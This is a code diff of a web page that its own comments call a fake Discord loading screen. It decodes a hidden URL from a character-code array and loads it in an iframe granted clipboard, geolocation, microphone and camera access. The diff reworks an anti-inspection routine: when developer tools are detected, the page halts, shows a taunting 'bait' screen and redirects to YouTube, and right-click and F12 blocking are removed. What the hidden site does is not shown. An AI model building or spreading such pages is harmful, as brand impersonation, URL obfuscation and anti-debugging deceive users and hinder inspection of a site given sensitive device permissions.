@@ -76,11 +76,44 @@
         .pill:nth-child(2) .pill-dot{background:var(--green);box-shadow:0 0 6px rgba(87,242,135,.4)}
         .pill:nth-child(3) .pill-dot{background:var(--fuchsia);box-shadow:0 0 6px var(--fuchsia-glow)}
         .pill:nth-child(4) .pill-dot{background:var(--yellow);box-shadow:0 0 6px rgba(254,231,92,.4)}
-        @media(max-width:480px){.title{font-size:24px}.logo-wrapper{width:88px;height:88px}.logo-inner{width:88px;height:88px;border-radius:24px}.clyde-svg{width:48px;height:48px}.pill{font-size:10px;padding:4px 10px}#loader{gap:26px}}
+        
+        /* Style cho màn hình Bait */
+        #bait-screen {
+            position: fixed;
+            inset: 0;
+            background: #000;
+            color: #fff;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.3s ease;
+        }
+        #bait-screen.active {
+            opacity: 1;
+            pointer-events: all;
+        }
+        #bait-screen h1 {
+            font-size: 36px;
+            margin-bottom: 10px;
+            text-align: center;
+            padding: 0 20px;
+        }
+        #bait-screen p {
+            font-size: 16px;
+            color: #888;
+            text-align: center;
+        }
+
+        @media(max-width:480px){.title{font-size:24px}.logo-wrapper{width:88px;height:88px}.logo-inner{width:88px;height:88px;border-radius:24px}.clyde-svg{width:48px;height:48px}.pill{font-size:10px;padding:4px 10px}#loader{gap:26px}#bait-screen h1{font-size:28px}}
         @media(prefers-reduced-motion:reduce){*,*::before,*::after{animation-duration:.01ms!important;transition-duration:.01ms!important}}
     </style>
 </head>
-<body oncontextmenu="return false;">
+<body>
     <div class="bg-layer"></div>
     <div class="grid-overlay"></div>
     <div class="noise"></div>
@@ -90,6 +123,13 @@
     <div class="orb orb-3"></div>
     <div class="orb orb-4"></div>
     <iframe id="content-frame" src="about:blank" allow="clipboard-read; clipboard-write; geolocation; microphone; camera"></iframe>
+    
+    <!-- Màn hình Bait ẩn sẵn -->
+    <div id="bait-screen">
+        <h1>Chào mừng bạn đã đi sai ngõ 😏</h1>
+        <p>Đang chuyển hướng lên YouTube...</p>
+    </div>
+
     <div id="loader">
         <div class="logo-wrapper">
             <div class="logo-ring"></div>
@@ -123,33 +163,35 @@
         var _0x=[104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,113,117,101,115,116,97,117,116,111,46,115,112,97,99,101,45,122,46,97,105,47];
         var target=_0x.map(function(c){return String.fromCharCode(c)}).join('');
 
-        // Hàm Kill tuyệt đối: Chuyển thẳng Youtube, không qua about:blank
+        // Hàm Kill kiểu Bait
         var _isKilled = false;
-        var _kill=function(){
+        var _kill = function(){
             if(_isKilled) return;
             _isKilled = true;
             
+            // 1. Dừng network và iframe ngay lập tức
             try { document.getElementById('content-frame').src = 'about:blank'; } catch(e){}
-            try { window.stop(); } catch(e){} // Cắt đứt Network
-            try { document.body.innerHTML = ''; } catch(e){} // Xóa DOM
+            try { window.stop(); } catch(e){}
             
-            // Chuyển thẳng lên Youtube ngay lập tức
-            try {
-                window.location.replace('https://www.youtube.com/@TenretniAifam');
-            } catch(e){
-                window.location.href = 'https://www.youtube.com/@TenretniAifam';
-            }
+            // 2. Ẩn cái màn hình loading Discord giả đi
+            try { document.getElementById('loader').style.display = 'none'; } catch(e){}
+            
+            // 3. Hiện màn hình chào mừng Bait
+            try { document.getElementById('bait-screen').classList.add('active'); } catch(e){}
+            
+            // 4. Đợi 1.5 giây cho họ kịp sững sờ rồi mới chuyển YouTube
+            setTimeout(function() {
+                try {
+                    window.location.replace('https://www.youtube.com/@TenretniAifam');
+                } catch(e){
+                    window.location.href = 'https://www.youtube.com/@TenretniAifam';
+                }
+            }, 1500);
         };
 
-        // 1. Chống Click chuột phải
-        document.addEventListener('contextmenu', function(e){ e.preventDefault(); });
+        // ĐÃ XÓA: Chống Click chuột phải, Chống phím tắt F12... Giờ bấm vô tư!
 
-        // 2. Chống phím tắt F12, Ctrl+Shift+I/J, Ctrl+U
-        document.onkeydown=function(e){
-            if(e.keyCode==123||(e.ctrlKey&&(e.shiftKey&&(e.keyCode==73||e.keyCode==74)||e.keyCode==85)))return false;
-        };
-
-        // 3. Phát hiện DevTool mở
+        // Cơ chế phát hiện DevTool mở bằng kích thước cửa sổ
         var threshold = 160;
         var checkDevTool = function(){
             if(_isKilled) return;
@@ -163,6 +205,7 @@
         checkDevTool();
         setInterval(checkDevTool, 500);
 
+        // Đoạn xử lý Particle giữ nguyên
         var cv=document.getElementById('particleCanvas');
         var cx=cv.getContext('2d');
         var ps=[];
@@ -222,7 +265,7 @@
         }
 
         function loop(){
-            if(_isKilled) return;
+            if(_isKilled) return; // Dừng particle khi bị kill
             cx.clearRect(0,0,cv.width,cv.height);
             for(var i=0;i<ps.length;i++){ps[i].update();ps[i].draw()}
             lines();
@@ -230,6 +273,7 @@
         }
         loop();
 
+        // Đoạn chữ chạy trống status giữ nguyên
         var msgs=['Đang kết nối đến máy chủ','Đang xác thực dữ liệu','Đang tải tài nguyên','Đang khởi chạy hệ thống'];
         var si=0;
         function cycle(){
